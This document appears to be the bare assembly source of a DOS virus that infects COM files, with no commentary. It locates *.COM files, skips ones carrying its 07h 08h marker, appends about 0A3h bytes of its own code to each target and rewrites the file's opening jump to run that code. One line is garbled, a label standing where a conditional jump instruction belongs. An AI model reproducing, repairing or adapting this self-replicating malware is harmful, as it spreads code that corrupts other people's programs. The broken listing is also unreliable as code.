
data_2e         equ     1ABh                    

seg_a           segment byte public             
                assume  cs:seg_a, ds:seg_a      


                org     100h                    
s               proc    far

start:
                jmp     loc_1                   




                db      0CDh, 20h, 7, 8, 9      
                                                

loc_1:
                call    sub_1                   



s               endp


sub_1           proc    near                    
                pop     si                      
                sub     si,10Bh                 
                mov     bp,data_1[si]           
                add     bp,103h                 
                lea     dx,[si+1A2h]            
                xor     cx,cx                   
                                                
                mov     ah,4Eh                  
loc_2:
                int     21h                     

                jc      loc_6                   
                mov     dx,9Eh                  
                mov     ax,3D02h                
                int     21h                     

                mov     bx,ax                   
                mov     ah,3Fh                  
                lea     dx,[si+1A8h]            
                mov     di,dx                   
                mov     cx,3                    
                int     21h                     
                
                cmp     byte ptr [di],0E9h      
                                                
                je      loc_4                   
loc_3:
                mov     ah,4Fh                  
                jmp     short loc_2             
loc_4:
                mov     dx,[di+1]               
                mov     data_1[si],dx           
                xor     cx,cx                   
                mov     ax,4200h                
                int     21h                     

                mov     dx,di                   
                mov     cx,2                    
                mov     ah,3Fh                  
                int     21h                     

                cmp     word ptr [di],807h            
                loc_3                   

                xor     dx,dx                   
                xor     cx,cx                   
                mov     ax,4202h                
                int     21h                     

                cmp     dx,0                    
                jne     loc_3                   
                cmp     ah,0FEh                 
                jae     loc_3                   

                mov     ds:data_2e[si],ax       
                mov     ah,40h                  
                lea     dx,[si+105h]            
                mov     cx,0A3h                 
                int     21h                     

                jc      loc_5                   
                mov     ax,4200h                
                xor     cx,cx                   
                mov     dx,1                    
                int     21h                     

                mov     ah,40h                  
                lea     dx,[si+1ABh]            
                mov     cx,2                    
                int     21h                     



loc_5:
                mov     ah,3Eh                  
                int     21h                     

loc_6:
                jmp     bp                      

data_1          dw      0                       
                db      '*.COM',0               


sub_1           endp
seg_a           ends
                end     start

